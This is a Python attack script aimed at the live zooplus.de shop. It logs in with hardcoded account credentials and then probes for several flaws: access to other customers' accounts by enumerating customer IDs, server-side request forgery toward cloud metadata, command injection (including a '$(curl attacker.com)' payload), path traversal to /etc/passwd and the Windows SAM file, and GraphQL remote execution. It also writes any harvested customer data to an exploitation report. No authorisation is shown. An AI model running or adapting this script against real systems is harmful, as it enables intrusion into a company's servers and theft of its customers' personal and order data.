#!/usr/bin/env python3
"""Ultimate vulnerability hunt - test everything possible"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# 1. Test for real customer data in all endpoints
print("[*] Testing for real customer data access...")
customer_ids = [53260509, 53260633, 1, 2, 100, 999, 1000, 9999, 99999, 999999]

for customer_id in customer_ids:
    endpoints = [
        f"/myaccount/api/customer-config/v1/customerconfiguration/{customer_id}",
        f"/myaccount/api/order-details/v3/customer/{customer_id}",
        f"/myaccount/api/order-details/v3/customer/{customer_id}/orders",
        f"/protected/api/loyalty-management/bonus-points/customer/{customer_id}",
        f"/protected/api/loyalty-management/memberships/customer/{customer_id}",
        f"/protected/api/loyalty-management/memberships/customer/{customer_id}/overview",
    ]
    for ep in endpoints:
        try:
            resp = s.get(f"{base}{ep}", timeout=3, verify=False)
            if resp.status_code == 200:
                data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                if isinstance(data, dict) and data:
                    data_str = json.dumps(data)
                    # Check for real user data
                    if any(key in data_str.lower() for key in ['email', 'name', 'address', 'phone', 'order', 'balance', 'points', 'membership', 'total', 'price']):
                        # Check if it's not just empty/null
                        if data_str not in ['{}', '{"customer_info": null, "audiences": []}']:
                            print(f"  [CRITICAL] IDOR - Real customer data: {ep}")
                            print(f"      Data: {data_str[:300]}")
                            found_vulns.append({
                                "type": "idor",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "customer_id": customer_id,
                                "data": data_str[:500]
                            })
        except: pass

# 2. Test for SSRF in all POST endpoints
print("\n[*] Testing SSRF in POST endpoints...")
ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/admin",
    "http://localhost:8080/actuator",
    "file:///etc/passwd",
]

post_endpoints = [
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
    "/semiprotected/api/audiences-api/v1/me",
    "/semiprotected/api/checkout/state-api/v2/get",
]

for ep in post_endpoints:
    for payload in ssrf_payloads:
        try:
            resp = s.post(f"{base}{ep}", json={"url": payload, "callback": payload, "endpoint": payload, "link": payload}, timeout=5, verify=False)
            if resp.status_code == 200:
                if "169.254.169.254" in resp.text or "instance-id" in resp.text.lower() or "ami-id" in resp.text.lower():
                    print(f"  [CRITICAL] SSRF: {ep}")
                    found_vulns.append({
                        "type": "ssrf",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "payload": payload
                    })
        except: pass

# 3. Test for Command Injection
print("\n[*] Testing Command Injection...")
cmd_payloads = [
    "; cat /etc/passwd",
    "| whoami",
    "`id`",
    "$(curl attacker.com)",
    "& ping -c 3 127.0.0.1",
    "; ls -la",
]

for ep in post_endpoints:
    for payload in cmd_payloads:
        try:
            resp = s.post(f"{base}{ep}", json={"test": payload, "name": payload, "command": payload}, timeout=5, verify=False)
            if resp.status_code == 200:
                if "uid=" in resp.text or "root:" in resp.text or "www-data" in resp.text or "bin/bash" in resp.text:
                    print(f"  [CRITICAL] Command Injection: {ep}")
                    found_vulns.append({
                        "type": "command_injection",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "payload": payload
                    })
        except: pass

# 4. Test for Path Traversal
print("\n[*] Testing Path Traversal...")
path_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

file_endpoints = [
    "/api/file",
    "/api/files",
    "/myaccount/api/file",
    "/semiprotected/api/file",
    "/checkout/api/file",
]

for ep in file_endpoints:
    for payload in path_payloads:
        try:
            resp = s.get(f"{base}{ep}?file={payload}&path={payload}&filename={payload}", timeout=3, verify=False)
            if resp.status_code == 200 and "root:" in resp.text:
                print(f"  [CRITICAL] Path Traversal: {ep}")
                found_vulns.append({
                    "type": "path_traversal",
                    "severity": "CRITICAL",
                    "endpoint": ep,
                    "payload": payload
                })
        except: pass

# 5. Test GraphQL
print("\n[*] Testing GraphQL...")
graphql_endpoints = [
    "/graphql",
    "/api/graphql",
    "/checkout/api/graphql",
    "/myaccount/api/graphql",
    "/semiprotected/api/graphql",
]

for ep in graphql_endpoints:
    # Introspection
    try:
        resp = s.post(f"{base}{ep}", json={"query": "{__schema{types{name}}}"}, timeout=3, verify=False)
        if resp.status_code == 200 and "__schema" in resp.text:
            print(f"  [CRITICAL] GraphQL Introspection: {ep}")
            found_vulns.append({
                "type": "graphql_introspection",
                "severity": "CRITICAL",
                "endpoint": ep
            })
    except: pass
    
    # Mutation for RCE
    try:
        resp = s.post(f"{base}{ep}", json={"query": "mutation { execute(command: \"id\") }"}, timeout=3, verify=False)
        if resp.status_code == 200 and "uid=" in resp.text:
            print(f"  [CRITICAL] GraphQL RCE: {ep}")
            found_vulns.append({
                "type": "graphql_rce",
                "severity": "CRITICAL",
                "endpoint": ep
            })
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'payload' in v:
            print(f"    Payload: {v['payload']}")
        if 'customer_id' in v:
            print(f"    Customer ID: {v['customer_id']}")
        if 'data' in v:
            print(f"    Data: {v['data'][:200]}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ УЯЗВИМОСТИ НАЙДЕНЫ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{v['payload']}`\n\n")
            if 'customer_id' in v:
                f.write(f"**Customer ID:** `{v['customer_id']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No additional vulnerabilities found in this round")

print("=" * 70)

